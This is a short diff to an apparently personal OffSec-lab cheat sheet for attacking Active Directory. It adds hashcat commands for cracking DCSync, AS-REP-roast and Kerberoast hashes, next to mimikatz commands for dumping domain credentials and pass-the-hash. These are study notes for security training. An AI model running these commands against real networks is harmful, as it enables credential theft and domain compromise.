@@ -4564,7 +4564,9 @@ offsec:lab (admin)
 `mimikatz # lsadump::lsa /patch`  //Dumps cached domain credentials (Administrator, krbtgt, etc)  
 
 **Hashcat - crack the hash**   
-`kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  
+`kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  //descync  
+`kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  //AS-REP  
+`kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` //Kerberoasting from .\Rubeus.exe
 
 **Attack**
 `mimikatz # sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:NTLMHASH /run:cmd.exe`  //Pass-the-Hash  
